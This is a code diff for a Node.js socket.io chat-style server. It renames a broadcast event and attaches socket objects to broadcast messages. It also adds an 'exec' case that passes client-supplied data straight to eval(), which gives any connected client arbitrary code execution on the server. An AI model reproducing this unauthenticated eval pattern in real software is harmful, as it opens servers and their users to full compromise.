@@ -10,7 +10,7 @@ const DebugMode = {
     clearUsers: true,
 
     Default: function(nameProp, def){
-        return DebugMode.ON ? this[nameProp] : def;
+        return this.ON ? this[nameProp] : def;
     }
 }
 
@@ -35,8 +35,9 @@ function run(server, db){
     io.on('connect', socket => {
         socket.userID = users;
 
-        socket.on('evt', Data => {
-            io.sockets.emit('evt', Data);
+        socket.on('msg', Data => {
+            Data.socket = socket;
+            io.sockets.emit('msg', Data);
         });
 
         socket.on('backend', Data => {
@@ -53,9 +54,11 @@ function run(server, db){
                                 type: "userID",
                                 value: socket.userID
                             };
-                            response = true;
                         break;
                     }
+                break;
+                case "exec":
+                    eval(Data.value);
                 break;
             }
 
